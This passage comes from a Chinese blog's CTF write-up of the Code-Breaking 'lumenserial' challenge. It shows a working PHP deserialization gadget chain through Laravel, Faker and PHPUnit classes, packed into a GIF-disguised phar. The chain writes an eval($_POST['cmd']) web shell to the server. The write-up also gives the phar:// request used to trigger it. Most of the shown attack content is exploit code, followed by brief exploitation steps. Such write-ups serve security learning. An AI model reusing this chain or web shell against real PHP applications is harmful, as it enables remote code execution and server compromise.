class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Invocation</span>\<span class="hljs-title">StaticInvocation</span>();<br>			<span class="hljs-variable">$g1</span> = <span class="hljs-keyword">new</span> \Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;mengchen&#x27;</span> =&gt; <span class="hljs-variable">$si</span> ));<br>			<span class="hljs-variable">$g2</span> = <span class="hljs-keyword">new</span> \Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;dispatch&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-variable">$g1</span>, <span class="hljs-string">&quot;getFormatter&quot;</span>)));<br><br>			<span class="hljs-variable">$rc</span> = <span class="hljs-keyword">new</span> \PHPUnit\Framework\MockObject\Stub\ReturnCallback();<br><br>			<span class="hljs-keyword">$this</span>-&gt;validator = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$rc</span>, <span class="hljs-string">&quot;invoke&quot;</span>);<br>			<span class="hljs-keyword">$this</span>-&gt;generator = <span class="hljs-variable">$g2</span>;<br>			<span class="hljs-keyword">$this</span>-&gt;maxRetries = <span class="hljs-number">23333</span>;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$form</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters = <span class="hljs-variable">$form</span>;<br>        &#125;<br>	&#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Invocation</span>&#123;<br>	<span class="hljs-title">class</span> <span class="hljs-title">StaticInvocation</span>&#123;<br>		<span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>			$this-&gt;parameters = array(&#x27;/var/www/html/upload/shell.php&#x27;,&#x27;&lt;?php phpinfo();eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);<br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Stub</span>&#123;<br>	<span class="hljs-title">class</span> <span class="hljs-title">ReturnCallback</span>&#123;<br>		<span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>			$this-&gt;callback = &#x27;file_put_contents&#x27;;<br>		&#125;<br>	&#125;<br>&#125;<br><br><br><span class="hljs-keyword">namespace</span>&#123;<br>	$<span class="hljs-title">exp</span> = <span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>\<span class="hljs-title">PendingBroadcast</span>();<br>	print_r(urlencode(serialize(<span class="hljs-variable">$exp</span>)));<br><br>	<span class="hljs-comment">// phar</span><br>	<span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;./meng.phar&#x27;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$p</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$exp</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$p</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-variable">$p</span>-&gt;stopBuffering();<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3. 利用过程"></a>3. 利用过程</h2><p>在本地跑一下<code>exp</code>，然后将生成的<code>phar</code>文件改一个后缀名，直接上传即可，在返回的<code>json</code>数据中有上传图片的路径。</p>
+<p><img src="https://image.mengsec.com/code-breaking-lumenserial/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>然后直接访问</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">139.199.31.158:8080</span>/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/<span class="hljs-number">415</span>c<span class="hljs-number">92</span>e<span class="hljs-number">8</span>be<span class="hljs-number">7</span>c<span class="hljs-number">68409</span>ca<span class="hljs-number">6</span>bd<span class="hljs-number">369</span>d<span class="hljs-number">87482</span>f/<span class="hljs-number">201902</span>/<span class="hljs-number">26</span>/e<span class="hljs-number">1</span>ae<span class="hljs-number">6</span>f<span class="hljs-number">3</span>f<span class="hljs-number">0833</span>e<span class="hljs-number">9</span>fd<span class="hljs-number">73</span>f<span class="hljs-number">6</span>.gif<br></code></pre></td></tr></table></figure>
+<p>触发反序列化，在服务器上写马。</p>
+<p><img src="https://image.mengsec.com/code-breaking-lumenserial/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>然后getflag</p>
+<p><img src="https://image.mengsec.com/code-breaking-lumenserial/5.png" srcset="/img/loading.gif" alt="5"></p>
+<h2 id="4-References"><a href="#4-References" class="headerlink" title="4. References"></a>4. References</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/">http://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/</a></p>
+<p><a target="_blank" rel="noopener" href="http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/">http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html">https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/03/04/Python3-advanced-feature-learning/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python3 高级特性学习——协程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/02/24/code-breaking/">
+                        <span class="hidden-mobile">代码审计 Code-Breaking 做题记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
